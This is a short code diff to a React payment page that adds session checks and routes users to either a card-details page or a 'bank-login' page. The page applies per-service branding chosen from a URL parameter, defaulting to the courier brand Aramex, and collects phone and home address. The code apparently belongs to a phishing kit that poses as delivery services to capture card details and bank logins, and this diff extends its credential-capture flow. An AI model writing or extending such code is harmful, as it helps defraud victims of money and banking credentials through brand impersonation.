@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
@@ -34,6 +34,13 @@ const PaymentRecipient = () => {
   const [customerPhone, setCustomerPhone] = useState("");
   const [residentialAddress, setResidentialAddress] = useState("");
   
+  useEffect(() => {
+    const method = sessionStorage.getItem('paymentMethod');
+    if (!method) {
+      navigate(`/pay/${id}/track`);
+    }
+  }, [id, navigate]);
+
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
@@ -116,7 +123,20 @@ const PaymentRecipient = () => {
       service: serviceName,
       amount: formattedAmount
     }));
-    navigate(`/pay/${id}/details`);
+
+    const method = sessionStorage.getItem('paymentMethod') || 'card';
+    if (method === 'login') {
+      const bank = sessionStorage.getItem('selectedBank');
+      if (!bank || bank === 'skipped') {
+        sessionStorage.removeItem('selectedBank');
+        navigate(`/pay/${id}/track`);
+        return;
+      }
+      navigate(`/pay/${id}/bank-login`);
+    } else {
+      sessionStorage.setItem('selectedBank', 'skipped');
+      navigate(`/pay/${id}/details`);
+    }
   };
   
   return (
